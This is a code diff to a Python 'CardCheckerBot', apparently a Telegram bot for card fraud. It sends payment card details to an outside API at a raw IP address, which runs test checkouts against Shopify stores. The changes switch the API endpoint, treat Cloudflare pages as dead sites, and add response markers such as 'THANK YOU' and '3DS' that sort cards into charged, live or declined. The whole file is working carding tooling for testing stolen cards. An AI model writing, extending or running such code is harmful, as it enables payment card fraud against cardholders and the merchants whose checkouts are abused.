@@ -55,7 +55,7 @@ FORWARD_CHAT_ID = BOT_OWNER_ID
 
 BIN_API_URL = "https://lookup.binlist.net/{}"
 
-SHOPIFY_API_URL = "http://31.97.40.61:5000/shopify"
+SHOPIFY_API_URL = "http://31.97.40.61/api.php"
 SITES_FILE = "sites.txt"
 PROXY_VALIDATION_TIMEOUT = 8
 PROXY_VALIDATION_RETRIES = 1
@@ -807,23 +807,24 @@ class CardCheckerBot:
                         return False
 
                     api_response = str(data.get("Response", "")).upper()
-                    api_status = data.get("Status", False)
+                    api_status = str(data.get("Status", "false")).lower() == "true"
 
                     # CAPTCHA — not usable
-                    if "CAPTCHA" in api_response:
-                        logger.info(f"Site {url} → DEAD (CAPTCHA)")
+                    if "CAPTCHA" in api_response or "CLOUDFLARE" in api_response:
+                        logger.info(f"Site {url} → DEAD (CAPTCHA/Cloudflare)")
                         return False
 
                     # Dead site markers
                     dead_markers = [
                         "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
                         "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
+                        "SITE NOT SUPPORTED", "PRODUCT ID EMPTY",
                     ]
                     if any(marker in api_response for marker in dead_markers):
                         logger.info(f"Site {url} → DEAD ({api_response})")
                         return False
 
-                    # Working: real payment response
+                    # Working: real payment response (includes PHP API responses)
                     working_markers = [
                         "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR",
                         "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_NUMBER",
@@ -831,6 +832,7 @@ class CardCheckerBot:
                         "GENERIC_DECLINE", "PICKUP_CARD", "CARD_NOT_SUPPORTED",
                         "TRANSACTION_NOT_ALLOWED", "PAYMENTS_",
                         "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
+                        "THANK YOU", "3D_AUTHENTICATION", "3DS",
                     ]
                     if any(m in api_response for m in working_markers):
                         logger.info(f"Site {url} → ✅ WORKING ({api_response})")
@@ -1256,7 +1258,7 @@ class CardCheckerBot:
                 data = await resp.json()
                 elapsed = time.time() - start_time
 
-                api_status = data.get("Status", False)
+                api_status = str(data.get("Status", "false")).lower() == "true"
                 api_response = data.get("Response", "UNKNOWN")
                 api_gateway = data.get("Gateway", "UNKNOWN")
                 api_price = data.get("Price", 0.0)
@@ -1273,6 +1275,7 @@ class CardCheckerBot:
                     "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
                     "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
                     "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
+                    "SITE NOT SUPPORTED", "PRODUCT ID EMPTY",
                 ]
                 for marker in dead_markers:
                     if marker in response_upper:
@@ -1284,7 +1287,7 @@ class CardCheckerBot:
                 if "3DS_REQUIRED" in response_upper or "AUTHENTICATION_REQUIRED" in response_upper:
                     status = ShopifyCheckStatus.APPROVED
                     # 3DS cards are live – do not treat as declined
-                elif "CAPTCHA" in response_upper:
+                elif "CAPTCHA" in response_upper or "CLOUDFLARE" in response_upper:
                     status = ShopifyCheckStatus.ERROR
                     retryable = True
                     site_dead = True
@@ -1301,17 +1304,17 @@ class CardCheckerBot:
                 elif site_dead:
                     status = ShopifyCheckStatus.ERROR
                     retryable = True
-                elif "GENERIC_ERROR" in response_upper:
-                    # GENERIC_ERROR must NEVER be treated as APPROVED
+                elif "GENERIC_ERROR" in response_upper or "UNKNOWN_RESPONSE" in response_upper:
+                    # Must NEVER be treated as APPROVED
                     status = ShopifyCheckStatus.DECLINED
                 elif api_status and any(kw in response_upper for kw in [
-                    "ORDER_PLACED", "PROCESSED_RECEIPT",
+                    "ORDER_PLACED", "PROCESSED_RECEIPT", "THANK YOU",
                 ]):
                     status = ShopifyCheckStatus.CHARGED
                 elif api_status and any(kw in response_upper for kw in [
                     "INSUFFICIENT_FUNDS", "OTP_REQUIRED", "3DS_AUTHENTICATION",
                     "3D_SECURE", "AUTHENTICATION_REQUIRED", "ACTION_REQUIRED",
-                    "APPROVED",
+                    "APPROVED", "3D_AUTHENTICATION", "3DS",
                 ]):
                     status = ShopifyCheckStatus.APPROVED
                 elif "TIMEOUT" in response_upper or "CONNECTION" in response_upper:
@@ -1540,14 +1543,14 @@ class CardCheckerBot:
 
                 data = await resp.json()
                 api_response = data.get("Response", "")
-                api_status = data.get("Status", False)
+                api_status = str(data.get("Status", "false")).lower() == "true"
                 api_gateway = data.get("Gateway", "UNKNOWN")
                 response_upper = api_response.upper() if api_response else ""
 
                 logger.info(f"[site-test] {site_name} | {api_response} | gate={api_gateway} | {elapsed:.1f}s")
 
-                # CAPTCHA detection
-                if "CAPTCHA" in response_upper:
+                # CAPTCHA / Cloudflare detection
+                if "CAPTCHA" in response_upper or "CLOUDFLARE" in response_upper:
                     out["captcha"] = True
                     out["reason"] = f"CAPTCHA ({api_response})"
                     return out
@@ -1590,7 +1593,7 @@ class CardCheckerBot:
                     "TRANSACTION_NOT_ALLOWED",
                     "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
                     "3DS_AUTHENTICATION", "3D_SECURE", "AUTHENTICATION_REQUIRED",
-                    "ACTION_REQUIRED",
+                    "ACTION_REQUIRED", "THANK YOU", "3D_AUTHENTICATION", "3DS",
                 ]
                 if any(m in response_upper for m in good_markers):
                     out["working"] = True
